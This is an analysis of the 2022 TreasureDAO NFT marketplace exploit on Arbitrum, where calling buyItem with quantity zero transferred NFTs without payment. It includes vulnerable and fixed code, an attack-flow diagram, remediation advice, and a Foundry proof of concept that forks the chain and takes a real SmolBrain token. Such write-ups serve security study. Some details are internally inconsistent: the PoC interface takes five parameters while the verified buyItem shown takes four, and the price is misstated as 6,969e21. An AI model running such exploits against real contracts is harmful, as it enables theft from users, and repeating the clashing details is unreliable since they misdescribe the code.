# TreasureDAO — buyItem Free NFT Purchase Vulnerability Analysis

| Field | Details |
|------|------|
| **Date** | 2022-03-03 |
| **Protocol** | TreasureDAO Marketplace |
| **Chain** | Arbitrum |
| **Loss** | Multiple NFTs stolen for free (including SmolBrain NFTs) |
| **Attacker** | Attacker address unconfirmed |
| **Vulnerable Contract** | TreasureMarketplaceBuyer [0x812cdA2181ed7c45a35a691E0C85E231D218E273](https://arbiscan.io/address/0x812cdA2181ed7c45a35a691E0C85E231D218E273) |
| **Root Cause** | `buyItem()` function does not validate the payment amount when called with quantity=0, allowing NFTs listed at normal prices to be purchased for 0 MAGIC |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2022-03/TreasureDAO_exp.sol) |

---
## 1. Vulnerability Overview

TreasureDAO's NFT marketplace provided a `buyItem()` function for purchasing NFTs using MAGIC tokens as payment. This function accepted a quantity parameter and calculated the total payment as `price × quantity`.

The vulnerability lay in allowing `quantity=0`. When quantity is 0, the payment amount becomes 0, enabling NFT transfers without any MAGIC. Since ERC721-based marketplaces trade NFTs in units of 1, it was possible to receive NFTs for free by exploiting the seller's existing approval.

The attack occurred on Arbitrum, and multiple NFTs were stolen, including SmolBrain (ERC721, ID 3557).

---
## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable TreasureMarketplaceBuyer.buyItem() (pseudocode)
contract TreasureMarketplaceBuyer {
    IERC20 public MAGIC;

    struct Listing {
        address seller;
        address nftAddress;
        uint256 tokenId;
        uint256 quantity;
        uint256 pricePerItem;
        uint256 expirationTime;
    }

    mapping(address => mapping(uint256 => Listing)) public listings;

    function buyItem(
        address _nftAddress,
        uint256 _tokenId,
        address _owner,
        uint256 _quantity,  // ❌ 0 is allowed
        uint256 _pricePerItem
    ) external {
        Listing memory listing = listings[_nftAddress][_tokenId];
        require(listing.quantity >= _quantity, "not enough quantity");
        require(listing.pricePerItem == _pricePerItem, "price mismatch");

        // ❌ If _quantity = 0, payment amount = 0
        uint256 totalPrice = _pricePerItem * _quantity;

        if (totalPrice > 0) {
            MAGIC.transferFrom(msg.sender, _owner, totalPrice);
        }
        // ❌ NFT transfer occurs even when _quantity = 0
        IERC721(_nftAddress).safeTransferFrom(_owner, msg.sender, _tokenId);

        emit ItemSold(_nftAddress, _tokenId, _quantity, totalPrice);
    }
}

// ✅ Correct pattern
function buyItem(..., uint256 _quantity, ...) external {
    // ✅ quantity must be at least 1
    require(_quantity > 0, "quantity must be positive");

    uint256 totalPrice = _pricePerItem * _quantity;
    require(totalPrice > 0, "total price must be positive");

    MAGIC.transferFrom(msg.sender, _owner, totalPrice);
    IERC721(_nftAddress).safeTransferFrom(_owner, msg.sender, _tokenId);
}
```

---
### On-Chain Original Code

Source: Sourcify verified


**TreasureMarketplace.sol** — Entry point / Vulnerable location:
```solidity
// ❌ Root cause: `buyItem()` function does not validate payment amount when called with quantity=0, allowing NFTs listed at normal prices to be purchased for 0 MAGIC
    function buyItem(
        address _nftAddress,
        uint256 _tokenId,
        address _owner,
        uint256 _quantity
    )
        external
        nonReentrant
        isListed(_nftAddress, _tokenId, _owner)
        validListing(_nftAddress, _tokenId, _owner)
    {
        require(_msgSender() != _owner, "Cannot buy your own item");

        Listing memory listedItem = listings[_nftAddress][_tokenId][_owner];
        require(listedItem.quantity >= _quantity, "not enough quantity");

        // Transfer NFT to buyer
        if (IERC165(_nftAddress).supportsInterface(INTERFACE_ID_ERC721)) {
            IERC721(_nftAddress).safeTransferFrom(_owner, _msgSender(), _tokenId);  // ❌ Unauthorized transferFrom
        } else {
            IERC1155(_nftAddress).safeTransferFrom(_owner, _msgSender(), _tokenId, _quantity, bytes(""));
        }

        if (listedItem.quantity == _quantity) {
            delete (listings[_nftAddress][_tokenId][_owner]);
        } else {
            listings[_nftAddress][_tokenId][_owner].quantity -= _quantity;
        }

        emit ItemSold(
            _owner,
            _msgSender(),
            _nftAddress,
            _tokenId,
            _quantity,
            listedItem.pricePerItem
        );

        TreasureNFTOracle(oracle).reportSale(_nftAddress, _tokenId, paymentToken, listedItem.pricePerItem);
        _buyItem(listedItem.pricePerItem, _quantity, _owner);
    }
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
    │
    ├─[1] Identify SmolBrain NFT #3557 listed on marketplace
    │       Look up original seller address
    │       ownerOf(3557) = seller address
    │
    ├─[2] Call TreasureMarketplaceBuyer.buyItem()
    │       _nftAddress    = SmolBrain (0x6325439...)
    │       _tokenId       = 3557
    │       _owner         = seller address
    │       _quantity      = 0          ← ⚡ Key: zero quantity
    │       _pricePerItem  = 6,969,000,000,000,000,000,000 (6,969 MAGIC)
    │
    ├─[3] Contract processing:
    │       totalPrice = 6,969e21 × 0 = 0
    │       MAGIC payment skipped (totalPrice == 0)
    │       IERC721.safeTransferFrom(seller, attacker, 3557) executed
    │
    ├─[4] NFT receipt confirmed via onERC721Received callback
    │
    └─[5] SmolBrain #3557 acquired for free
            MAGIC payment: 0
```

---
## 4. PoC Code (Core Logic + Comments)

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.10;

import "forge-std/Test.sol";

interface ITreasureMarketplaceBuyer {
    function buyItem(
        address nftAddress,
        uint256 tokenId,
        address owner,
        uint256 quantity,
        uint256 pricePerItem
    ) external;
}

interface IERC721 {
    function ownerOf(uint256 tokenId) external view returns (address);
    function safeTransferFrom(address from, address to, uint256 tokenId) external;
}

contract ContractTest is Test {
    ITreasureMarketplaceBuyer marketplace =
        ITreasureMarketplaceBuyer(0x812cdA2181ed7c45a35a691E0C85E231D218E273);
    IERC721 smolBrain = IERC721(0x6325439389E0797Ab35752B4F43a14C004f22A9c);
    uint256 constant TOKEN_ID = 3557;

    function setUp() public {
        vm.createSelectFork("arbitrum", 7_322_694);
    }

    function testExploit() public {
        address originalOwner = smolBrain.ownerOf(TOKEN_ID);
        emit log_named_address("[Before] SmolBrain #3557 owner", originalOwner);

        // ⚡ Key: call buyItem with quantity=0
        // Payment amount = pricePerItem × 0 = 0
        // NFT transfer executes normally
        marketplace.buyItem(
            address(smolBrain),
            TOKEN_ID,
            originalOwner,
            0,                              // ← quantity = 0 (free purchase)
            6_969_000_000_000_000_000_000   // Original listing price (not paid)
        );

        emit log_named_address("[After] SmolBrain #3557 owner", smolBrain.ownerOf(TOKEN_ID));
        emit log_string("NFT stolen for free!");
    }

    // ERC721 receipt confirmation callback
    function onERC721Received(address, address, uint256, bytes calldata)
        external pure returns (bytes4)
    {
        return this.onERC721Received.selector;
    }
}
```

---
## 5. Vulnerability Classification (Table)

| Category | Details |
|------|-----------|
| **Vulnerability Type** | Improper Input Validation |
| **CWE** | CWE-20: Improper Input Validation |
| **OWASP DeFi** | Missing zero-quantity payment validation |
| **Attack Vector** | Acquire NFT without MAGIC payment via buyItem(quantity=0) |
| **Precondition** | Seller has approved the marketplace contract for their NFT |
| **Impact** | All NFTs listed on the marketplace can be stolen for free |

---
## 6. Remediation Recommendations

1. **quantity > 0 validation**: A single line `require(_quantity > 0, "quantity must be >= 1")` would have prevented this.
2. **Payment amount validation**: Add `require(totalPrice > 0, "price must be positive")`.
3. **NFT transfer ordering**: Apply the Checks-Effects-Interactions pattern — transfer the NFT only after confirming successful payment.
4. **Boundary value testing**: Write tests covering 0, 1, and maximum values for all numeric quantity parameters.

---
## 7. Lessons Learned

- **Simple bug, massive damage**: The absence of a single `require(_quantity > 0)` line neutralized the entire marketplace.
- **Boundary value validation**: For numeric parameters such as quantities and amounts, always handle 0 and negative values (or overflow in the case of `uint`).
- **NFT marketplace security**: NFT marketplaces must handle the payment-transfer sequence atomically, analogous to real-world asset transactions.
- **March 2022 on Arbitrum**: TreasureDAO was a core protocol in the early Arbitrum ecosystem, and this incident raised widespread awareness of NFT marketplace security on Arbitrum.